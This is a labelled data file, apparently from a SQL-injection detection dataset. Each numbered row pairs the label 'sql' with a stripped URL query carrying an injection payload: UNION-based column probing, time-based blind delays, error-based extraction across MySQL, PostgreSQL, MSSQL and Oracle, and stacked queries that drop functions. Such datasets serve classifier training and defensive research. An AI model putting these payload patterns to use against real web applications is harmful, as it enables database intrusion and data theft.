2775,sql,". . . . ? = & = & =   "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " cUHL " = " "
2776,sql,". . / / / ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL # "
2777,sql,". . . . ? = & =   ; SELECT SLEEP ( ) # "
2778,sql,". . ? =   ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( = "
2779,sql,". . ? = & = & = & =   ) ) ) AND = # "
2780,sql,". . . / ? = & = & =   "" ) ; WAITFOR DELAY ' : : '  --"
2781,sql,". . / / / ? =  - % ' ) UNION ALL SELECT , ,  -- "
2782,sql,". . / / / / ? =  - "" UNION ALL SELECT , , , , , , , , , # "
2783,sql,". . ? =   % "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " % " = " "
2784,sql,". . . . / ? = & = & = & =   "" ) ) AND =  -- "
2785,sql,". . . . / ? = & = & =   ) ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ( = "
2786,sql,". . / / / / ? = & =  - ) ) ORDER BY  -- "
2787,sql,". . ? = & = & =   ) AND SLEEP ( ) AND ( = "
2788,sql,". . . / ? = & = & =   ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( = "
2789,sql,". . . / / ? =  - ) ) UNION ALL SELECT , , # "
2790,sql,". . . / ? = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' AVNt ' LIKE ' "
2791,sql,". . / ? = & = & = & =   ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( = "
2792,sql,". . . . / ? = & =  - ' UNION ALL SELECT , , , ,  -- "
2793,sql,". . / / ? = & =  - ' ) ) UNION ALL SELECT , , , , , , , , # "
2794,sql,". . / / / / ? = & = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( = "
2795,sql,". . . / ? = & =   ' ) ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ( ' dtvs ' = ' "
2796,sql,". . . . ? = & = & = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2797,sql,". . . / ? =  - ' ORDER BY  -- "
2798,sql,". . ? =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) ) "
2799,sql,". . . ? = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2800,sql,". . / / ? = & = & =   % ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' % ' = ' "
2801,sql,". . / / / ? = & = & = & =   % ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' % ' = ' "
2802,sql,". . . . ? =   "" ) ) AND MAKE_SET ( = , ) AND ( ( " QarM " = " "
2803,sql,". . . / / / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
2804,sql,". . . ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2805,sql,". . . ? = & = & = & =   ; WAITFOR DELAY ' : : '  --"
2806,sql,". . . . / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL # "
2807,sql,". . . . / / ? = & = & = & =  - ) ) UNION ALL SELECT # "
2808,sql,". . . / / / ? = & =   "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2809,sql,". . . / ? = & =   ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' KmUo ' LIKE ' "
2810,sql,". . ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2811,sql,". . . . ? =  - ' ) ) UNION ALL SELECT , , , , , , , , ,  -- "
2812,sql,". . . . / / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' Danm ' = ' "
2813,sql,". . . / ? =   ) ) ) ORDER BY  -- "
2814,sql,". . . / / ? = & =   ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( = "
2815,sql,". . / / ? =   ' ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ' NUvC ' = ' "
2816,sql,". . . . / ? = & = & =  - "" ) ) UNION ALL SELECT , , , , , # "
2817,sql,". . . / / ? = & =   "" ) ORDER BY # "
2818,sql,". . . . ? = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2819,sql,". . . / / / / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
2820,sql,". . . . / / ? = & = & =   ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' mqdG ' LIKE ' "
2821,sql,". . . / ? = & =   RLIKE SLEEP ( ) # "
2822,sql,". . / ? =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' zpwY ' LIKE ' "
2823,sql,". . . . / / / / ? =  - ' ) ) UNION ALL SELECT , ,  -- "
2824,sql,". . ? = & =   ) ) ) AND =  -- "
2825,sql,". . . . / ? =   "" ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( " zbWb " = " "
2826,sql,". . . . / / ? = & = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " CZky " LIKE " "
2827,sql,". . ? = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
2828,sql,". . . ? = & = & =   ' AND = AND ' hmSF ' = ' "
2829,sql,". . . / / / / ? = & = & = & =   "" ) ORDER BY  -- "
2830,sql,". . . . ? = & = & = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " EFcZ " LIKE " "
2831,sql,". . . . ? =   % ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' % ' = ' "
2832,sql,". . / / / ? =   PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2833,sql,". . / / / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL -- "
2834,sql,". . . . / / ? = & = & = & =  - ' ) ) UNION ALL SELECT , # "
2835,sql,". . . . / ? = & = & = & =   ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION Slbb --"
2836,sql,". . . / / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2837,sql,". . . / / ? = & = & = & =   ' AND =  -- "
2838,sql,". . . / / / / ? = & =   % ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' % ' = ' "
2839,sql,". . . / / ? = & =   ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( = "
2840,sql,". . . / / ? = & = & =   "" RLIKE SLEEP ( ) AND " IYXU " = " "
2841,sql,". . . ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2842,sql,". . / / / / ? = & = & = & =   % ' ) ; WAITFOR DELAY ' : : '  --"
2843,sql,". . . . / / ? = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' SwFV ' LIKE ' "
2844,sql,". . / / / ? = & = & = & =   ' AND = AND ' hmSF ' = ' "
2845,sql,". . . . / / / ? = & = & =   "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " zwgm " = " "
2846,sql,". . . . / / ? =   "" ) ORDER BY  -- "
2847,sql,". . / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2848,sql,". . / / / / ? =  - ) ) ) UNION ALL SELECT , , , , ,  -- "
2849,sql,". . / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL -- "
2850,sql,". . . . / / / / ? =   "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " LRDU " LIKE " "
2851,sql,". . . . / / / / ? = & = & = & =  - ) ) ) UNION ALL SELECT , , , , # "
2852,sql,". . . / / / / ? = & = & = & =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION TQqK --"
2853,sql,". . / / ? = & = & =   ' ) ; SELECT SLEEP ( ) AND ( ' lmSu ' = ' "
2854,sql,". . . . / / ? = & =  - UNION ALL SELECT , , ,  -- "
2855,sql,". . / / ? = & = & =   "" UNION ALL SELECT NULL , NULL -- "
2856,sql,". . . . ? =  - "" UNION ALL SELECT , # "
2857,sql,". . . . / ? = & =   % ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' % ' = ' "
2858,sql,". . . / / ? = & = & = & =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' % ' = ' "
2859,sql,". . . ? =   "" ) ; SELECT SLEEP ( ) AND ( " xzdz " = " "
2860,sql,". . / / / ? = & = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' ISyL ' LIKE ' "
2861,sql,". . / ? = & = & = & =   % ' AND = % "
2862,sql,". . . / / / ? =   "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2863,sql,". . . . ? = & = & =   ' ) ; SELECT SLEEP ( ) # "
2864,sql,". . ? = & =   AND =  -- "
2865,sql,". . / / / ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2866,sql,". . . ? =   AND = ( SELECT  FROM PG_SLEEP ( ) ) "
2867,sql,". . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2868,sql,". . . / ? = & = & =  - UNION ALL SELECT , , , , , # "
2869,sql,". . . / / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2870,sql,". . . . ? =  - UNION ALL SELECT , , , , # "
2871,sql,". . / / ? =    PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2872,sql,". . . . ? = & = & = & =  - UNION ALL SELECT , , , , , , , , # "
2873,sql,". . / / / / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2874,sql,". . . / ? = & =   ' ) ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ( ' PPDU ' = ' "
2875,sql,". . . / / / ? = & = & = & =  - ' UNION ALL SELECT , # "
2876,sql,". . . . / / / ? =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2877,sql,". . . . / / ? = & = & = & =   ' ) ) AND SLEEP ( ) AND ( ( ' eWzK ' LIKE ' "
2878,sql,". . . / ? = & =   ' ) ) UNION ALL SELECT NULL # "
2879,sql,". . / / / / ? = & =   ) ) AND SLEEP ( ) AND ( ( = "
2880,sql,". . . . / ? = & =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( " ClLF " LIKE " "
2881,sql,". . . . / / / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2882,sql,". . . . / / / / ? = & = & = & =   % "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND " % " = " "
2883,sql,". . . ? =  - ' UNION ALL SELECT , , , , , , , , , # "
2884,sql,". . ? =  - "" ) UNION ALL SELECT , ,  -- "
2885,sql,". . / / / / ? = & =   ' ; IF ( = ) SELECT  ELSE DROP FUNCTION uSEw --"
2886,sql,". . . . / ? = & = & = & =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
2887,sql,". . / / / ? = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' IXoy ' LIKE ' "
2888,sql,". . . / / / ? = & = & = & =  - ) ) UNION ALL SELECT , # "
2889,sql,". . . . ? = & = & = & =   ' AND ELT ( = , SLEEP ( ) ) AND ' lYGJ ' = ' "
2890,sql,". . / / / ? = & = & = & =   % ' UNION ALL SELECT NULL -- "
2891,sql,". . / / / ? = & = & = & =   ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' FRGc ' LIKE ' "
2892,sql,". . / / / / ? = & = & = & =  - ) ) UNION ALL SELECT , , , , # "
2893,sql,". . . . / / / ? =   "" AND =  -- "
2894,sql,". . . . / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2895,sql,". . . / / / / ? = & =   ; SELECT SLEEP ( ) # "
2896,sql,". . ? = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " pktX " = " "
2897,sql,". . / / / ? =  - ' UNION ALL SELECT , , , , , , ,  -- "
2898,sql,". . . . / / ? =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' uROo ' = ' "
2899,sql,". . / / / / ? = & = & =   ' ) ) ORDER BY # "
2900,sql,". . / / ? = & = & =   ' ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ' rjQQ ' = ' "
2901,sql,". . / / / / ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2902,sql,". . . . / / / ? = & = & = & =   ' ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ' zrkf ' = ' "
2903,sql,". . . . / / ? =  - "" ) ) UNION ALL SELECT ,  -- "
2904,sql,". . / / / / ? = & = & =   AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) # "
2905,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , , # "
2906,sql,". . . / ? = & = & = & =   "" AND = AND " RPbj " LIKE " "
2907,sql,". . . . / ? = & =   % ' AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2908,sql,". . . / / / / ? = & =   % ' AND = # "
2909,sql,". . / / / / ? = & = & =   ' ) ORDER BY  -- "
2910,sql,". . / / / ? = & = & = & =   % ' ) ) AND SLEEP ( ) AND ( ( ' % ' = ' "
2911,sql,". . . . / ? =   ' ) AND = AND ( ' qxFF ' LIKE ' "
2912,sql,". . . . / ? = & = & =  - UNION ALL SELECT , , , , , # "
2913,sql,". . . . / / ? = & =   ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
2914,sql,". . . . / / ? = & =   "" ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
2915,sql,". . . / / ? = & = & = & =  - ' UNION ALL SELECT  -- "
2916,sql,". . ? =   % "" ; SELECT PG_SLEEP ( )  --"
2917,sql,". . . . / / ? = & = & =  - UNION ALL SELECT , , , , , # "
2918,sql,". . / / ? =   ' ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ' zDWs ' = ' "
2919,sql,". . / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2920,sql,". . . . / / / / ? = & = & = & =   "" ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( " ILCH " LIKE " "
2921,sql,". . ? = & =  - % ' ) UNION ALL SELECT # "
2922,sql,". . / / / / ? = & =   ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( = "
2923,sql,". . / ? = & = & =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION EilX --"
2924,sql,". . / / / / ? = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2925,sql,". . . . / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2926,sql,". . . / ? =   % "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND " % " = " "
2927,sql,". . . . / / / ? = & = & =  - ORDER BY  -- "
2928,sql,". . . . / ? = & = & =  - UNION ALL SELECT , , ,  -- "
2929,sql,". . / / / / ? = & = & = & =  - % "" UNION ALL SELECT , , , , # "
2930,sql,". . . . / / ? = & = & =    AND SLEEP ( )  -- "
2931,sql,". . . . / / ? = & =   ( CASE WHEN = THEN  ELSE NULL END ) "
2932,sql,". . . / ? = & =  - "" ) UNION ALL SELECT , , , , , # "
2933,sql,". . / / / / ? = & = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " cFwH " = " "
2934,sql,". . . . ? = & = & =   % ' ORDER BY # "
2935,sql,". . . . / / / / ? = & = & = & =   "" ) AND = AND ( " sRsH " = " "
2936,sql,". . / / / ? = & = & =   "" ) ; SELECT PG_SLEEP ( )  --"
2937,sql,". . . ? = & = & = & =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION axTb --"
2938,sql,". . . / ? = & = & =   ' ) ) ORDER BY # "
2939,sql,". . . ? = & = & = & =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' mEIK ' = ' "
2940,sql,". . . . ? = & =   "" ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
2941,sql,". . . . / / / ? = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
2942,sql,". . . . ? = & = & =  - ) ) ) UNION ALL SELECT , , , # "
2943,sql,". . . . ? = & =  - UNION ALL SELECT , , , , , , , , ,  -- "
2944,sql,". . . . ? = & = & = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( = "
2945,sql,". . . / / ? = & = & = & =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
2946,sql,". . . . / / ? = & = & =   ' ) ) AND SLEEP ( ) AND ( ( ' iypb ' = ' "
2947,sql,". . . / / ? = & = & = & =   ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION scfL --"
2948,sql,". . / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2949,sql,". . . . / / ? = & =    AND =  -- "
2950,sql,". . . . / ? = & =   "" ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( " ZYik " LIKE " "
2951,sql,". . . ? =  - ' ) ) ) UNION ALL SELECT , , , , , , # "
2952,sql,". . . / ? =  - ' ) UNION ALL SELECT , , , , , , , # "
2953,sql,". . / / ? =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2954,sql,". . . . ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2955,sql,". . / ? = & =   "" ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2956,sql,". . / / / / ? = & = & = & =   ) RLIKE SLEEP ( )  -- "
2957,sql,". . / / / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2958,sql,". . ? = & =  - ) UNION ALL SELECT , , , , , , , , ,  -- "
2959,sql,". . . . / / / ? = & = & = & =   ) ) ) AND =  -- "
2960,sql,". . . ? = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2961,sql,". . . / ? =  - ' ) ) ) UNION ALL SELECT ,  -- "
2962,sql,". . . / / / ? =  - % ' ) UNION ALL SELECT , , , , ,  -- "
2963,sql,". . . . ? = & = & =   ' ) ) ) ORDER BY  -- "
2964,sql,". . . / ? =    AND ELT ( = , SLEEP ( ) ) # "
2965,sql,". . . . ? = & =  - "" ) ) UNION ALL SELECT ,  -- "
2966,sql,". . / / ? = & =  - "" UNION ALL SELECT , , , , , , , ,  -- "
2967,sql,". . . ? =   ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( = "
2968,sql,". . . / / / ? =   "" UNION ALL SELECT NULL , NULL # "
2969,sql,". . . . / / / / ? = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' MVyi ' LIKE ' "
2970,sql,". . / / / ? = & =   "" ) AND ELT ( = , SLEEP ( ) ) AND ( " UMlC " = " "
2971,sql,". . . . / / / ? =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( " JmOR " LIKE " "
2972,sql,". . . . / / / ? = & = & =  - "" ) UNION ALL SELECT , , , , , # "
2973,sql,". . / / / / ? = & =   ' ORDER BY # "
2974,sql,". . / / / / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2975,sql,". . . . / / / ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , , , ,  -- "
2976,sql,". . . / ? = & =  - ' ) UNION ALL SELECT , , , , , , , # "
2977,sql,". . . . / ? = & =  - ' ) ) ORDER BY  -- "
2978,sql,". . . . / / / / ? = & =   ' ) AND MAKE_SET ( = , ) AND ( ' tKOT ' = ' "
2979,sql,". . ? =  - ) UNION ALL SELECT , , , # "
2980,sql,". . . . / / / ? = & = & = & =  - ' UNION ALL SELECT , , ,  -- "
2981,sql,". . . . ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
2982,sql,". . . . / / / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL # "
2983,sql,". . . / / ? = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
2984,sql,". . . . / / / ? = & = & = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
2985,sql,". . / / / / ? = & = & = & =   ' ) ) ) AND =  -- "
2986,sql,". . . ? = & = & =   AND = % "
2987,sql,". . . . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2988,sql,". . . . / / / / ? = & = & = & =   % ' ) ) ; WAITFOR DELAY ' : : '  --"
2989,sql,". . . . / / / ? =   "" ; SELECT PG_SLEEP ( )  --"
2990,sql,". . . / / ? = & =    AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) # "
2991,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , # "
2992,sql,". . . ? =   ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' cHXg ' LIKE ' "
2993,sql,". . ? =   ) AND ELT ( = , SLEEP ( ) )  -- "
2994,sql,". . . . / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2995,sql,". . . / / / ? = & = & = & =  - ) ) UNION ALL SELECT , # "
2996,sql,". . . . / / / ? = & =   ' ) ) ) AND = AND ( ( ( ' ZMNr ' = ' "
2997,sql,". . . / / / ? = & =   ' ) ) ORDER BY # "
2998,sql,". . / / / ? = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' lXEF ' = ' "
